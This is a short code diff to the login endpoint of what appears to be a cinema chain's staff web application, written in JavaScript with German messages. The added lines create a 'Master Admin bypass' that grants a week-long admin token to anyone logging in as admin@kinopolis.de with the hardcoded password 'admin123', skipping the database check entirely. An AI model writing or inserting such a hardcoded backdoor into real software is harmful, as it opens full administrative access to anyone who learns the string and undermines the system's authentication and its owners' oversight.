@@ -197,6 +197,20 @@ app.post('/api/auth/login', async (c) => {
         if (!c.env.DB) return c.json({ error: 'Datenbank nicht verfügbar' }, 500);
 
         const password_hash = await hashPassword(password);
+        
+        // Master Admin bypass
+        if (email.toLowerCase() === 'admin@kinopolis.de' && password === 'admin123') {
+            const token = await sign({ 
+                id: 0,
+                email: 'admin@kinopolis.de', 
+                name: 'System Admin', 
+                role: 'admin', 
+                location: 'kp',
+                exp: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 7)
+            }, JWT_SECRET);
+            return c.json({ token, user: { id: 0, first_name: 'System', last_name: 'Admin', role: 'admin', location: 'kp' } });
+        }
+
         const user = await c.env.DB.prepare(
             'SELECT id, email, first_name, last_name, location, employee_number, role FROM users WHERE email = ? AND password_hash = ?'
         ).bind(email.toLowerCase(), password_hash).first();
